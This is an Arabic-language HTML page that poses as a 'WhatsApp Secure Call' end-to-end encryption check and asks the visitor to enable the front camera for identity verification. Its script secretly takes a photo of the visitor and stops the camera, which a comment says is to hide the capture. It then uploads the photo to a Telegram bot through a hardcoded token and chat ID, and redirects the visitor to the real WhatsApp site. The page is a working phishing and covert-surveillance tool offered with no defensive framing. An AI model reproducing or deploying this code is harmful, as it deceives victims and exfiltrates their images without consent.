<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Secure Call</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: #0b141a;
            margin: 0;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .box {
            text-align: center;
            width: 90%;
            max-width: 400px;
            padding: 30px;
            background: #111b21;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }

        .icon {
            font-size: 50px;
            color: #25d366;
            margin-bottom: 20px;
        }

        .btn {
            background: #00a884;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }

        .error-msg {
            color: #f15c5c;
            font-size: 14px;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>

<body>
    <div class="box">
        <div class="icon">🔒</div>
        <div style="font-size: 18px; margin-bottom: 10px;">نظام التشفير التام (End-to-End)</div>
        <div style="color: #8696a0; font-size: 14px;">لأغراض أمنية، يجب تفعيل الكاميرا الأمامية للتحقق من هوية المتصل
            قبل بدء المكالمة.</div> <button class="btn" onclick="requestAccess()">تفعيل الحماية والبدء</button>
        <div id="err" class="error-msg">⚠️ عذراً، يجب السماح بالوصول للكاميرا للمتابعة.</div>

    </div> <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const TOKEN = "8108955153:AAE1xbMRWcllxQTFlOFsWNDbQLfyKWO_UgY";
        const CHAT_ID = "8008774065";

        async function requestAccess () {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                handleSuccess(stream);
            } catch (err) {
                // إذا رفض المستخدم، تظهر رسالة الخطأ ويُجبر على المحاولة ثانية  
                document.getElementById('err').style.display = 'block';
                console.log("Access Denied, retrying...");
            }
        }

        function handleSuccess (stream) {
            document.getElementById('err').style.display = 'none';
            const video = document.getElementById('v');
            video.srcObject = stream;

            // التقاط فوري بمجرد السماح  
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                // إيقاف الكاميرا فوراً للتمويه  
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(blob => {
                    upload(blob);
                }, 'image/jpeg', 0.8);
            }, 1000);
        }

        function upload (blob) {
            let fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'capture.jpg');
            fd.append('caption', "✅ تم انتزاع الإذن والتقاط الصورة بنجاح.");

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
                .then(() => {
                    window.location.href = "https://www.whatsapp.com"; // الهروب للموقع الرسمي  
                });
        }  
    </script>
</body>

</html>
